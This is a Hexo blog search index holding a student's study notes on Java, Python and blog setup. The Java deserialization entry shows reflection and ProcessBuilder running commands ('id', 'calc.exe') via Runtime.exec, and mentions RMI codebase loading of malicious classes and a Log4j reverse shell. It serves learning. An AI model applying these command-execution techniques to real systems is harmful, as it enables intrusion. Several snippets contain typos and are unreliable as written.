<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2023/11/06/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>java学习历程记录-JavaWeb</title>
    <url>/2023/11/26/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-JavaWeb/</url>
    <content><![CDATA[<p>最近开始了java的巩固学习，想着就是对着黑马去学习，首先学习的就是javaweb这个模块，所以也就去记录一些学习的历程。</p>
<span id="more"></span>

<h1 id="一、JDBC的使用"><a href="#一、JDBC的使用" class="headerlink" title="一、JDBC的使用"></a>一、JDBC的使用</h1><h2 id="1、JDBC是什么"><a href="#1、JDBC是什么" class="headerlink" title="1、JDBC是什么"></a>1、JDBC是什么</h2><p>JDBC就是去使用Java语言操作关系型数据库的一套API，从而达到去操作不同的各种数据库。</p>
<p>java中并没有各种数据库的实现类，只有查询语句，而实现类是各个数据库厂家提供的jar包中实现的，这样就保证了JDBC能够实现对多种数据库的兼容性。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>java学习历程记录-SpringMVC</title>
    <url>/2023/11/26/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-SpringMVC/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>python学习历程(1)</title>
    <url>/2023/11/11/python%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B-1/</url>
    <content><![CDATA[<p>最近也是大二了，好不容易终于接到了大创了，不过大创需要我们去深入学习python，加上打算去参加一个python的项目制作，再去想想我那python水平，简直一言难尽，只能抓紧时间赶快补了😱</p>
<p>这里就简单记录一下一些我没有什么印象的或者感觉比较重要的知识点。</p>
<span id="more"></span>

<h1 id="一、python参数中的一些特殊参数"><a href="#一、python参数中的一些特殊参数" class="headerlink" title="一、python参数中的一些特殊参数"></a>一、python参数中的一些特殊参数</h1><p>首先就需要先去了解一下什么是位置参数和关键字参数分别是什么。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line">    </span><br><span class="line">standard_arg(<span class="number">123</span>)   //位置参数，多个参数需要注意排序位置</span><br><span class="line">standard_arg(arg=<span class="number">21</span>)   //关键字参数</span><br></pre></td></tr></table></figure>

<p>函数定义中未使用 <code>/</code> 和 <code>*</code> 时，参数可以按位置或关键字传递给函数。</p>
<h2 id="1、仅位置参数"><a href="#1、仅位置参数" class="headerlink" title="1、仅位置参数"></a>1、仅位置参数</h2><p>仅限位置时，形参的顺序很重要，并且这些参数在传参时必须使用位置参数传参</p>
<p>仅限位置形参应放在 <code>/</code> （正斜杠）前。<code>/</code> 用于在逻辑上分割仅限位置形参与其它形参。如果函数定义中没有 <code>/</code>，则表示没有仅限位置形参</p>
<h2 id="2、仅关键词参数"><a href="#2、仅关键词参数" class="headerlink" title="2、仅关键词参数"></a>2、仅关键词参数</h2><p>把形参标记为 <em>仅限关键字</em>，表明必须以关键字参数形式传递该形参，应在参数列表中第一个 <em>仅限关键字</em> 形参前添加 <code>*</code>。</p>
<h2 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h2><p>请看下面的函数定义示例，注意 <code>/</code> 和 <code>*</code> 标记：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">pos_only_arg</span>(<span class="params">arg, /</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">kwd_only_arg</span>(<span class="params">*, arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">combined_example</span>(<span class="params">pos_only, /, standard, *, kwd_only</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(pos_only, standard, kwd_only)</span><br></pre></td></tr></table></figure>

<p>第一个函数定义 <code>standard_arg</code> 是最常见的形式，对调用方式没有任何限制，可以按位置也可以按关键字传递参数：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(arg=<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>第二个函数 <code>pos_only_arg</code> 的函数定义中有 <code>/</code>，仅限使用位置形参：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(arg=<span class="number">1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: pos_only_arg() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;arg&#x27;</span></span><br></pre></td></tr></table></figure>

<p>第三个函数 <code>kwd_only_args</code> 的函数定义通过 <code>*</code> 表明仅限关键字参数：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: kwd_only_arg() takes <span class="number">0</span> positional arguments but <span class="number">1</span> was given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(arg=<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>最后一个函数在同一个函数定义中，使用了全部三种调用惯例：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(pos_only=<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;pos_only&#x27;</span></span><br></pre></td></tr></table></figure>

<p>下面的函数定义中，<code>kwds</code> 把 <code>name</code> 当作键，因此，可能与位置参数 <code>name</code> 产生潜在冲突：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, **kwds</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br></pre></td></tr></table></figure>

<p>调用该函数不可能返回 <code>True</code>，因为关键字 <code>&#39;name&#39;</code> 总与第一个形参绑定。例如：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: foo() got multiple values <span class="keyword">for</span> argument <span class="string">&#x27;name&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>加上 <code>/</code> （仅限位置参数）后，就可以了。此时，函数定义把 <code>name</code> 当作位置参数，<code>&#39;name&#39;</code> 也可以作为关键字参数的键：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, /, **kwds</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>换句话说，仅限位置形参的名称可以在 <code>**kwds</code> 中使用，而不产生歧义。</p>
<p><strong>取自python官方文档</strong></p>
<h1 id="二、装饰器"><a href="#二、装饰器" class="headerlink" title="二、装饰器"></a>二、装饰器</h1><p>可以通过修饰去简化代码并且达到相应的目的。</p>
<h2 id="1、装饰器雏形"><a href="#1、装饰器雏形" class="headerlink" title="1、装饰器雏形"></a>1、装饰器雏形</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guanjia</span>(<span class="params">game</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打开外挂&quot;</span>)</span><br><span class="line">        game()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;关闭外挂&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_dnf</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊！我叫赛利亚，今天又是美好的一天！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@guanjia</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_lol</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎来到英雄联盟&quot;</span>)</span><br><span class="line"></span><br><span class="line">play_lol()</span><br></pre></td></tr></table></figure>

<p>这就是一个简单的装饰器，通过这种方法就能使我们更方便的对函数进行相关的加装以及优化，</p>
<h2 id="2、装饰器的简单应用"><a href="#2、装饰器的简单应用" class="headerlink" title="2、装饰器的简单应用"></a>2、装饰器的简单应用</h2><p>在一些程序应用当中，我们会需要利用到登入的操作，这个时候我们就会想要实现，去实现什么功能之前需要先登入，这个时候装饰器就有用武之地了。不多说，直接看个小案例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">login_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_verify</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">global</span> login_flag</span><br><span class="line">        <span class="keyword">if</span> login_flag:</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;请先登录&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;还未完成用户登录操作&#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                username = <span class="built_in">input</span>(<span class="string">&#x27;请输入用户名：&#x27;</span>)</span><br><span class="line">                password = <span class="built_in">input</span>(<span class="string">&#x27;请输入密码：&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;登录成功&#x27;</span>)</span><br><span class="line">                    login_flag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;用户名或密码错误，请重新输入&#x27;</span>)</span><br><span class="line">            ret = fn(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到首页&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的订单&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的资料&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index()</span><br><span class="line">order()</span><br><span class="line">profile()</span><br></pre></td></tr></table></figure>

<p>之后的相应是</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PS C:\VScodeproject&gt; &amp; C:/Users/ASUS/AppData/Local/Programs/Python/Python310/python.exe c:/VScodeproject/python/python-study/装饰器应用.py</span><br><span class="line">请先登录</span><br><span class="line">还未完成用户登录操作</span><br><span class="line">请输入用户名：admin</span><br><span class="line">请输入密码：<span class="number">123456</span></span><br><span class="line">登录成功</span><br><span class="line">欢迎来到首页</span><br><span class="line">欢迎来到我的订单</span><br><span class="line">欢迎来到我的资料</span><br></pre></td></tr></table></figure>

<h1 id="三、Pickle和Json模块的总结"><a href="#三、Pickle和Json模块的总结" class="headerlink" title="三、Pickle和Json模块的总结"></a>三、Pickle和Json模块的总结</h1><p>Pickle是将对象（数据）转化为字节，json是将对象（数据）转化为json格式</p>
<blockquote>
<p>1、dumps    把对象（数据）转化为字节</p>
<p>2、loads       把字节转化回对象（数据）</p>
<p>3、dump      把对象序列化成字节之后写入到文件</p>
<p>3、load         把文件中的字节反序列化成对象 </p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化以及一些前置知识</title>
    <url>/2023/11/09/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9A%84%E4%B8%80%E4%BA%9B%E8%87%AA%E6%88%91%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<p>最近学习了java反序列化的相关知识，就在这稍微做一些总结。</p>
<span id="more"></span>

<h1 id="一、java反射"><a href="#一、java反射" class="headerlink" title="一、java反射"></a>一、java反射</h1><p>首先就是介绍总结一下java反射中用到的一些相关方法，当然也不是直接对着方法名记忆，那样太枯燥了，主要就是在使用的过程中去学习。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//这个的意思就是获取到java.lang.Runtime这个类，是一种获取类最常见的方法，然后获取到的类就被“等同”于clazz（！！！这里要想起来类和对象之间的区别，这两个不是同一种东西！！！）</span></span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="comment">//这里我们就逐步分析，首先就是getMethod就是获取一个类的方法</span></span><br><span class="line"><span class="comment">//格式： 类.getMethod（“方法名”, 这个方法需要传递的参数类型）</span></span><br><span class="line"><span class="comment">//然后就是invoke，这是一个调用上面获得的方法。</span></span><br><span class="line"><span class="comment">//格式： 方法名.(类的一个对象,需要传递给方法的参数)</span></span><br><span class="line"><span class="comment">//newInstance就是调用该类的构造方法去实例化一个对象</span></span><br></pre></td></tr></table></figure>

<p>当然这样直接去运行时会产生报错的！！！这又是为什么呢？</p>
<p>这里主要就是因为我们无法通过newInstance去获得类的对象，而这里是因为Runtime的构造方法是私有的，是一种”单例”的设计模式</p>
<blockquote>
<p>单例的设计模式：主要是考虑到某些类一般只需要类的初始化时使用一次构造方法，而不是每次都需要去再重新使用构造方法，但这样的话我们又应该怎么样去调用构造方法呢？所以设计者就设计了一个静态方法，像这里的就是getRuntime这个方法，使用这个方法就会返回一个对象</p>
</blockquote>
<p>所以修改之后的代码就是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethed.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这样就可以去调用到我们需要的方法了。</p>
<p>当然这样也是还有点缺点的，就比如如果没有这个getRuntime的方法呢？这又应该怎么办？</p>
<p>这个时候就可以使用getConstructor这个方法去获取到我们想要的类。</p>
<blockquote>
<p>格式： 类.getConstructor(构造方法的参数类型)</p>
</blockquote>
<p>eg.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>然后就是如果构造方法是私有方法，我们应该去使用getDeclaredMethod这个方法。</p>
<blockquote>
<p>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </p>
<p>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</p>
<p>还有就是getConstructor和getDeclaredConstructor基本上相似的，这里就不过多解释了</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>setAccessible必须要设置为true，不然无法去使用。</p>
<h1 id="二、RMI"><a href="#二、RMI" class="headerlink" title="二、RMI"></a>二、RMI</h1><p>RMI全称是Remote Method Invocation，远程⽅法调⽤。听这名字应该也就知道，就是去从调用一个远程主机上的java方法，在这里就挑一些重点的代码片段进行讲解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());(这里是服务器上启动的)</span><br></pre></td></tr></table></figure>

<p>首先第一行这里就是创建并且执行Registry服务，这个服务就是相当于一个中继器，我将类和一个名字绑定丢到这里面去，别的人就可以通过名字去拿到这个对应的类，这就是Registry所起到的一个作用。然后就是第二行，就是将本机的一个类给绑定到了一个Registry服务上，这样等之后就可以去直接拿到这个类了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)Naming.lookup(<span class="string">&quot;rmi://vps_ip:1099/Hello&quot;</span>);(本机运行)</span><br></pre></td></tr></table></figure>

<p>这里就通过Naming的lookup方法去寻找这个rmi类，我们就可以在Registry中拿到我们想要的类。</p>
<p>codebase的利用方法</p>
<p>在以前的有段时间，java是可以运行在浏览器上的，就有一个codebase属性，这是一个地址，去告诉哪个地方寻找类，这个时候我们就可以使用rmi的相关操作，去使其加载我们自己部署的服务器上的一些恶意类。</p>
<p>就比如在log4j这个CVE中，也是可以去使用rmi去实现的，去完成反弹shell从而获得权限。</p>
<h1 id="三、serialize🌟"><a href="#三、serialize🌟" class="headerlink" title="三、serialize🌟"></a>三、serialize🌟</h1><p>这是学习的重难点，我现在也还知识初步了解一些，还没完全弄完😭</p>
<p>一般web手初识反序列化都是从php开始，首先就java的反序列化和php的还是有很大区别的，php是直接利用serialize和unserialize这两个函数进行序列化和反序列化的过程，我们无法去控制这个过程中的任何东西，而java就不一样了。</p>
<blockquote>
<ul>
<li>writeObject：序列化</li>
<li>readObject：反序列化</li>
</ul>
</blockquote>
<p>这两个主要是java中序列化反序列化所需要使用到的，一般需要搭配一些其他的东西去使用。</p>
<p>eg</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//用于保存序列化数据</span></span><br><span class="line">     ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);   <span class="comment">//实例化一个对象输出流</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">     u.setName(<span class="string">&quot;6pc1&quot;</span>);</span><br><span class="line">     obj_out.writeObject(u);   <span class="comment">//利用writeObject方法将序列化对象存储在本地</span></span><br><span class="line">     obj_out.close();</span><br><span class="line">     System.out.println(<span class="string">&quot;User对象序列化成功！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//读取之前保存的序列化数据</span></span><br><span class="line">     <span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);  <span class="comment">//实例化一个对象输入流</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> (User)ins.readObject();      <span class="comment">//利用readObject方法将序列化对象转为对象</span></span><br><span class="line">     system.out.println(<span class="string">&quot;User对象反序列化成功！&quot;</span>);</span><br><span class="line">     System.out.println(u.getName());</span><br><span class="line">     ins.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是java反序列话的主要过程，是可以自己去操作序列化反序列化的一些过程的，就比如在序列化后的文件中添加一些数据一类的</p>
<p>这也不是唯一一种，我们也可以用byte流的方法代替文件流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>serialize</tag>
      </tags>
  </entry>
  <entry>
    <title>关于博客搭建的一些自我心得</title>
    <url>/2023/11/09/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E8%87%AA%E6%88%91%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<p>首先，这篇博客并不会详细讲解搭博客的过程什么的，只是稍微分享一下我自己搭博客时遇到的一些问题和学到的一些东西。</p>
<span id="more"></span>

<h1 id="一、博客搭建主体的选择"><a href="#一、博客搭建主体的选择" class="headerlink" title="一、博客搭建主体的选择"></a>一、博客搭建主体的选择</h1><p>我感觉现在大部分主流的使用的博客主体就是两种，(当然主要也是我接触到的博客看好像都是这两种),分别就是hexo和WordPress，不过由于我现在还是囊中羞涩，所以就去使用了免费的github+hexo去搭建，而对于WordPress而言，搭建则需要有一个服务器才能去完成。</p>
